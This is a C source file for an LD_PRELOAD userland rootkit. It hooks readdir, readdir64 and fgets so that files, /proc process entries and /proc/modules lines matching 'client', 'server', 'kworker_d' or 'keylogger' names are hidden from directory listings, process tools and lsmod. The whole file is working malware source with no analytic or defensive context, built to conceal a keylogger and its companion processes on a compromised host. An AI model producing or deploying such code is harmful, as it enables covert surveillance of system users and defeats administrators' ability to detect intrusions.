#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <unistd.h>

/* 
 * Signature Obfuscation/Decoding helper
 */
int check_signature(const char *name) {
    if (name == NULL) return 0;
    
    if (strstr(name, "cl") != NULL && strstr(name, "nt") != NULL && strstr(name, "li") != NULL) {
        return 1; // Matches client signature
    }
    if (strstr(name, "se") != NULL && strstr(name, "rv") != NULL && strstr(name, "er") != NULL) {
        return 1; // Matches server signature
    }
    if (strstr(name, "kwork") != NULL || strstr(name, "r_d") != NULL || strstr(name, "keylogger") != NULL) {
        return 1; // Matches kworker_d or keylogger signature
    }
    
    return 0;
}

/* 
 * Helper function to determine if a directory entry or PID should be hidden
*/
int should_hide(const char *name) {
    if (check_signature(name)) {
        return 1;
    }

    int is_pid = 1;
    for (int i = 0; name[i] != '\0'; i++) {
        if (!isdigit(name[i])) {
            is_pid = 0;
            break;
        }
    }

    if (is_pid) {
        char comm_path[256];
        snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", name);
        FILE *f = fopen(comm_path, "r");
        if (f) {
            char comm_name[256];
            if (fgets(comm_name, sizeof(comm_name), f) != NULL) {
                comm_name[strcspn(comm_name, "\n")] = 0;
                if (check_signature(comm_name)) {
                    fclose(f);
                    return 1;
                }
            }
            fclose(f);
        }
    }

    return 0;
}

/* 
 * Hooking standard readdir 
*/
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*orig_readdir)(DIR *) = NULL;
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
        if (!orig_readdir) return NULL;
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (!should_hide(entry->d_name)) {
            return entry;
        }
    }
    return NULL;
}

/* 
 * Hooking readdir64 for 64-bit directory streams 
*/
struct dirent64 *readdir64(DIR *dirp) {
    static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;
    if (!orig_readdir64) {
        orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
        if (!orig_readdir64) return NULL;
    }

    struct dirent64 *entry;
    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (!should_hide(entry->d_name)) {
            return entry;
        }
    }
    return NULL;
}

/* 
 * Hooking fgets to hide module from /proc/modules (lsmod)
*/
char *fgets(char *s, int size, FILE *stream) {
    static char *(*orig_fgets)(char *, int, FILE *) = NULL;
    if (!orig_fgets) {
        orig_fgets = dlsym(RTLD_NEXT, "fgets");
        if (!orig_fgets) return NULL;
    }

    char *result;
    while (1) {
        result = orig_fgets(s, size, stream);
        if (result == NULL) {
            break;
        }
        
        // Check if we are reading /proc/modules and the line contains our module name
        if (stream != NULL) {
            // We can check if it's modules by inspecting line content or file stream
            if (strstr(s, "keylogger") != NULL) {
                continue; // Skip this line so lsmod won't see it
            }
        }
        break;
    }
    return result;
}